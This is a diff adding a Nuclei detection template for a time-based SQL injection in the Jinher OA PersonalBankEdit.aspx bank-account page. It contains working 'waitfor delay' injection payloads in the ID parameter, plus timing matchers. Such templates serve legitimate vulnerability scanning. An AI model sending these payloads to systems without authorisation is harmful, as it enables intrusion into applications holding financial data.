@@ -1,0 +1,46 @@
+id: poc-yaml-jinher-jhsoft-personalbankedit-aspx-sqli
+info:
+  name: 金和OA PersonalBankEdit.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 金和OA
+  description: |
+    A SQL injection vulnerability in the 金和OA PersonalBankEdit.aspx endpoint.
+
+http:
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.CostControl/PersonalBankEdit.aspx/?ID=1'waitfor+delay%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-SQLi-Detection
+
+      - |
+        GET /c6/Jhsoft.Web.CostControl/PersonalBankEdit.aspx/?ID=1'waitfor+delay%270:0:8%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-SQLi-Detection
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "JHSoft"
+      - type: word
+        words:
+          - "修改银行帐户"
+        part: body
+      - type: word
+        words:
+          - "开户行"
+        part: body
+      - type: word
+        words:
+          - "请输入开户帐号"
+        part: body
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
